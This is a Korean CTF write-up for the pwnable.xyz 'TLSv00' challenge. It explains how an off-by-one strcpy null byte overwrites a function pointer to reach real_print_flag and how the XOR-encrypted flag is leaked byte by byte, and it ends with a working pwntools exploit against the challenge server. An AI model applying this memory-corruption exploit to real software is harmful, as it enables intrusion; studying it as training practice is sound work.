---
layout: post
title:  "Pwnable.xyz Tlsv00 write-up"
date:   2020-01-23 19:45:55
image:  pwnable_xyz_tls.PNG
tags:   [Pwnable_xyz]
categories: [Write-up]
---


### 1.  문제

 

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20TLSv00/Untitled.png)

해당 문제는 다음과 같은 보호기법이 걸려있다. 쉽지 않을꺼같은 예상이든다..

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20TLSv00/Untitled%201.png)

한번 실행시켜 보자. 전의 문제와 같이 메뉴를 입력할 수 있는 공간이 나온다. 문제이름도 그렇고 뭔가 암호화와 관련되어 보인다. 빠르게 코드를 한번 봐보자<br><br>

    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      int v3; // eax
      unsigned int v4; // [rsp+Ch] [rbp-4h]
    
      setup(argc, argv, envp);
      puts("Muahaha you thought I would never make a crypto chal?");
      generate_key(63LL);
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            print_menu();
            printf("> ");
            v3 = read_int32();
            if ( v3 != 2 )
              break;
            load_flag();
          }
          if ( v3 > 2 )
            break;
          if ( v3 != 1 )
            goto LABEL_12;
          printf("key len: ");
          v4 = read_int32();
          generate_key(v4);
        }
        if ( v3 == 3 )
        {
          print_flag();
        }
        else if ( v3 != 4 )
        {
    LABEL_12:
          puts("Invalid");
        }
      }
    }

코드 흐름은 생각보다 간단하다. 우선 초기화 과정으로, genereate_key() 함수가 실행된다. 그다음 사용자 입력을 v3 변수에 담는다. 1을 입력하면 generate_key() 함수가 재실행되고, 2번을 입력하면 load_flag() 함수가 실행된다. 마지막으로 3번을 누르면 print_flag() 함수가 실행된다. 

그 이외의 값을 입력하면 "Invalid" 가 출력되면서 처음으로 돌아간다. 방금 말한 3개의 함수를 자세하게 살펴보자.

<br>

**1) generate_key()**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20TLSv00/Untitled%202.png)

함수의 주요 로직은 다음의 사진과 같다. /dev/urandom 를 이용하여 커널이 생성해주는 난수를 얻을 수 있는데, 매개변수로 넘어온 사이즈 만큼 해당 파일에서 변수에 저장을 한다.

그다음 s 배열에 한 바이트씩 한번더 저장을한다. 그다음 s 배열을 key 배열에 strcpy 함수를 이용하여 복사를 하고 끝나게 된다. 현재 해당 로직이 수행이 되기위한 조건으로는 매개변수의 사이즈가 0보다 크고 최대 0x40을 넘으면 안된다. s와 key 변수는 전역변수로 세팅이 되어있다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20TLSv00/Untitled%203.png)

.bss 영역을 보면 key 가 0x202040 오프셋 위치에 있다. 근데 do_comment 라는 변수도 바로 부터있는데 유심히 볼 필요가 있다. 또한 flag 라는 변수도 마찬가지로 do_comment 아래에 존재한다.

<br>

**2) load_flag()**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20TLSv00/Untitled%204.png)

서버에 존재하는 flag 파일을 읽고 아까 .bss 영역에 위치에있는 flag 전역변수에 데이터를 0x40 만큼 넣는다. 아마 이 부분이 실제 플래그가 들어있는 부분일 것이다. 어쨋든 다시 반복문을 0~0x3f 돌면서 **flag[i] = flag[i] ^ key[i]** 연산을 진행한다.

서버의 플래그를 바로 저장하는 것이 아닌, generate_key 함수에서 생성한 난수를 이용하여 각 배열 인덱스마다 xor 연산을 진행한 뒤 다시 flag 변수에 넣는다. 이 부분을 통해 flag 변수는 암호화된 플래그가 저장되는 것으로 보인다.

<br>

**3) print_flag**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20TLSv00/Untitled%205.png)

해당 함수가 실행되면 warning이 뜨면서 do_commnet 함수의 주소를 result에 담는다. 그다음 do_comment 함수 주소의 하위 1바이트의 크기가 0인지 아닌지 검사를 한다

만약 0이면 조건문 안으로 들어와 설문조사를 할꺼냐고 묻고, y를 누르면 f_do_comment의 주소를 do_comment에 덮은뒤 해당 do_comment 함수가 실행된다.(실제로는 f_do_comment가 실행됨)

근데 아이다에서 real_print_flag 라는 함수가 있다. 이 함수는 f_do_comment 함수와 아주 가까운 곳에 위치한다. 한번 확인해보자.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20TLSv00/Untitled%206.png)

f_do_comment 함수와 한바이트만 다르다. 그렇다면 result 변수에 하위 1바트를 0으로 어떤 방법을 이용하여 저장을 시키면 real_print_flag함수가 실행될 것이다

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20TLSv00/Untitled%207.png)

real_print_flag 함수는 전역변수에 xor 연산되어 저장된 flag값이 들어있을 것이다.

 <br><br>

### 2. 접근방법

그렇다면이제 저 하위 1바이트를 어떻게 0으로 바꿀지를 생각해봐야한다. generate_key()함수에서 입력받을수 있는 최대사이즈는 0x40이다. 그리고 s버퍼의 사이즈는 72인데, memset을 통해 해당 버퍼는 0으로 초기화되어있다. 그렇다면 key len을 최대사이즈 0x40로 입력하고, 

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20TLSv00/Untitled%202.png)

<br>

밑에 strcpy 함수가 수행된다면,  s[0] ~ s[0x3f] 에 널바이트 s[0x40]이 추가로 붙어서 복사가 될 것이다. 결국 key는 총 0x41 바이트 가 복사되어 오버플로우가 일어난다. 즉, 다음과 같은 상황이 발생한다.

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20TLSv00/Untitled%208.png)

<br>

여기까지 내용을 정리하면 우선 3번 메뉴를 입력하여 f_do_comment 주소를 do_comment로 복사한다. 그다음 1번을 메뉴를 입력하여 0x40크기 입력을 통해 오버플로우를 일으킨다. 그다음 2번 메뉴를 통해 strcpy 함수가 실행되게 한다. 마지막으로 3번 메뉴를 입력하고 ~~instead? 부분에 n을 누른다.

현재 do_comment에는 f_do_comment의 주소가 들어가 있는데 오버플로우를 통해 하위 1바이트가 0으로 덮혀진다. 따라서 real_print_flag함수를 호출할 수 있게 되었다. 하지만 호출을 해도 의미가 없다. 출력되는 플래그는 암호화되었기 때문이다.  그래도 한번 확인해보자

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20TLSv00/Untitled%209.png)

음.. 다음과 같이 나온다. 자 이제 마지막으로 저 암호화된 부분을 어떻게 해결할 것인지 생각해야한다. 우리가 해결해야할 부분은 이 부분이다.

**flag[i] = flag[i] ^ key[i]**

flag와 key를 xor 해서 다시 flag에 넣기때문에 flag의 값이 암호화가 되는 것인데, 만약 key 부분의 데이터가 0이라면 flag는 0과 xor 연산이 진행되어, 자기 자신그대로 변화없이 저장된다.  현재 사용자가 입력할 수 있는 키의 사이즈는 최소 1부터 64까지이다. 만약 키 사이즈를 1로 했을때는 다음과 같은 로직이 수행된다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20TLSv00/Untitled%2010.png)

초기 memset으로 0으로 초기화 된 s가 strcpy를 통해 key에 0이 추가로 들어가고, flag의 인덱스 0과 1이 xor 연산이 각각 된다. 하지만 인덱스 1은 널바이트이므로 연산을 해도 자기 자신 그대로 값이 들어간다.

<br>

이를 이용해 각 배열의 원소 하나씩 알 수 있다. 따라서 키의 사이즈를 1부터 64까지 하나씩 반복문을 돌려 알아낼수 가 있을 것이다. 이 모든 과정을 정리하면 다음과 같다.

<br>

1. -> 3  :  'y'를 누른후 아무 값이나 입력하여 result에 f_do_comment 주소 담기
2. -> 1  :  64 len 입력하기
3. -> 2  :  strcpy 함수 수행되게 하기
4. -> 3  :  'n'을 누른후 result에 real_print_flag 주소 담기
5. 위 과정을 반복적으로 수행하여 플래그 출력하기. 단 1,2번 과정을 한번만 수행하게 하고 나머지 3,4,5를 반복으로 돌려야한다. 

<br><br>

### 3. 풀이

최종 익스코드는 다음과 같다

    from pwn import *
    
    #context.log_level='debug'
    p = remote("svc.pwnable.xyz",30006)
    #p=process('./challenge')
    #gdb.attach(p)
    def generateKey(size):
    	p.recvuntil('> ')
    	p.sendline("1")
    
    	if size==64: 
    		p.recvuntil("key len: ")
    		p.sendline(str(size))
    	else:
    		p.recvuntil("key len: ")
                    p.sendline(str(size+1))
    
    def load_flag():
    	p.recvuntil("> ")
    	p.sendline("2")
    
    def print_flag(index):
    	p.recvuntil("> ")
    	p.sendline("3")
    	
    	p.recvuntil("instead? ")
    	
    	if index=='y': 
    		p.sendline("y")
    		p.recvuntil("comment: ")
    		p.sendline("aaaaaaaa")
    	else:
    		p.sendline("n")
    
    def main():
    	flag=1
    	size=0
    	tmp=' '
    	while 1:
    		if flag==1:
    			print_flag('y')
    			generateKey(64)
    			flag=0
    		else:
    			generateKey(size)
    			load_flag()
    			print_flag('n')
    			tmp=tmp+p.recv(64)[size+1]
    			print("%s"%tmp),
    			size=size+1
    
    		if size==65:
    			break;
    
    if __name__ == '__main__':
    	main()

<br><br>

### 4. 몰랐던 개념

- None